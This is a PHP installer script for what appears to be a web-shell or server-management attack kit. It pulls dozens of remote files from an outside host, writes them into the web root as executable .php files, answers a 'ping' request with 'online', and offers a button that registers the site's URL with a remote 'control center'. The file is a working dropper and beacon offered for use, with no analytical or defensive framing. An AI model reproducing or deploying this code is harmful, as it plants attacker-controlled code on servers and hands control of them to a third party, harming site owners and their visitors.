<?php
set_time_limit(0);

if(isset($_POST['ping'])){
echo "online";
}

if(isset($_POST['install'])){

$installurl = "http://mrcheese.coconia.net/phpkit/";
$n = "001";

echo "<center><br><b>Installing...</b></center>";

while($n < "999"){
	$filename = "shc".$n . ".php";
	$remotename = "shc".$n . ".txt";
	$remotefile = $installurl . $remotename;
     if(!$dataopen = fopen($remotefile, 'r')){
    	 break;
     }else{
		 $data = file_get_contents($remotefile);
		 fclose($dataopen);
     }
	$handle = fopen($filename, 'w+');
	fwrite($handle, $data);
	fclose($handle);
	$n = $n + 1;
}


$remotefile = $installurl . "webadmin.txt";
$file = file_get_contents($remotefile);
$h = fopen("webadmin.php", "w+");
fwrite($h, $file);
fclose($h);


// CREATE SERVER MANAGEMENT
$remotefile = $installurl . "server.txt";
$file = file_get_contents($remotefile);
$menu = fopen("server.php", 'w+');
fwrite($menu, $file);
fclose($menu);
//


// CREATES MENU
$remotefile = $installurl . "shc000.txt";
$file = file_get_contents($remotefile);
$menu = fopen("shc000.php", 'w+');
fwrite($menu, $file);
fclose($menu);
//

// install auto scripts
$c = "000";
while($c < "999"){

$filename = "sha".$c . ".php";
$remotename = "sha".$c . ".txt";

$remotefile = $installurl . $remotename;

     if(!$dataopen = fopen($remotefile, 'r')){
     break;
     }else{
     $data = file_get_contents($remotefile);
     fclose($dataopen);
     }

$handle = fopen($filename, 'w+');
fwrite($handle, $data);
fclose($handle);

$c = $c + 1;
}
//


// save picture
$remotefile = $installurl . "subliminal.jpg";
$data = file_get_contents($remotefile);
$handle = fopen("subliminal.jpg", 'w+');
fwrite($handle, $data);
fclose($handle);
//

$fullurl = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
$url = str_replace("install.php", "", $fullurl);


echo "<div style=\"position: absolute; top: 0; left: 0; width: 100%;
height: 100%; background-color: #FFFFFF\">
<center><br><br><h1>Kit Installed</h1><br><br><b>View the Menu <a
href='shc000.php'>Here</a></b><br><br>
<b>REGISTER</b><br>
<form action='".$installurl."register.php' method='post'>
<input type='hidden' name='url' value='$url'><input type='submit'
name='register' value='REGISTER WITH CONTROL CENTER'></form> ";


} else {

echo "<center><br><br>
<form method='POST'>
<input type='submit' name='install' value='-- INSTALL --'>
</form>
";
}


?>